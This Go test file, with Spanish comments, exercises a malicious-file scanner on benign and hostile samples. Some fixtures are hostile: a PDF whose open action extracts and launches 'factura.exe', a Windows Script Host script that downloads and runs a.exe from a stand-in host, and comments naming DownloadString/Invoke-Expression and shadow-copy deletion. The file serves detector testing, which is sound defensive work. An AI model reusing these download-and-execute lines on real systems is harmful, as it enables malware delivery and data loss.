package main

import (
	"bytes"
	"compress/zlib"
	"fmt"
	"testing"
)

func pdfWith(js string, extra string) []byte {
	var z bytes.Buffer
	w := zlib.NewWriter(&z)
	w.Write([]byte(js))
	w.Close()
	return []byte(fmt.Sprintf("%%PDF-1.7\n1 0 obj << /Type /Catalog /OpenAction 3 0 R %s >> endobj\n3 0 obj << /S /JavaScript /JS 4 0 R >> endobj\n4 0 obj << /Length %d /Filter /FlateDecode >>\nstream\n%sendstream\nendobj\n%%%%EOF", extra, z.Len(), z.String()))
}

func TestFalsosPositivos(t *testing.T) {
	// apuntes de JavaScript (web / Node) con fetch, eval y exec
	js := `// Tema 4: peticiones\nfetch('https://api.example.com/data').then(r => r.json());\nconst x = eval('2+2');\nrequire('child_process').exec('ls');\napp.run();`
	if r := AnalyzeBytes("apuntes.js", []byte(js), int64(len(js))); r.Score > 0 {
		t.Errorf("apuntes JS: %d %+v", r.Score, r.Findings)
	}
	// PDF de un formulario con cálculos y acción al abrir
	b := pdfWith(`this.getField("total").value = AFNumber_Format(2); event.value = 3;`, "")
	if r := AnalyzeBytes("formulario.pdf", b, int64(len(b))); r.Verdict != "Sin señales de peligro" {
		t.Errorf("PDF formulario: %s %d %+v", r.Verdict, r.Score, r.Findings)
	}
	// PDF malicioso: extrae un adjunto y lo lanza
	b = pdfWith(`this.exportDataObject({cName:"factura.exe", nLaunch:2}); app.launchURL("http://bad.example.net");`, "")
	if r := AnalyzeBytes("factura.pdf", b, int64(len(b))); r.Verdict == "Sin señales de peligro" {
		t.Errorf("PDF malicioso no detectado: %+v", r.Findings)
	}
	// script de PowerShell cuyos COMENTARIOS hablan de malware
	ps := "<# Apuntes: el malware usa DownloadString + Invoke-Expression -WindowStyle Hidden #>\n# vssadmin delete shadows\nGet-Process | Sort-Object CPU"
	if r := AnalyzeBytes("apuntes.ps1", []byte(ps), int64(len(ps))); r.Score > 0 {
		t.Errorf("comentarios: %d %+v", r.Score, r.Findings)
	}
	// .js de Windows Script Host que descarga y ejecuta: sí es peligroso
	wsh := `var x=new ActiveXObject("MSXML2.XMLHTTP");x.open("GET","http://bad.example.net/a.exe",false);x.send();var s=new ActiveXObject("WScript.Shell");s.Run("a.exe",0,false);`
	if r := AnalyzeBytes("pedido.js", []byte(wsh), int64(len(wsh))); r.Verdict == "Sin señales de peligro" {
		t.Errorf("WSH: %+v", r.Findings)
	}
}
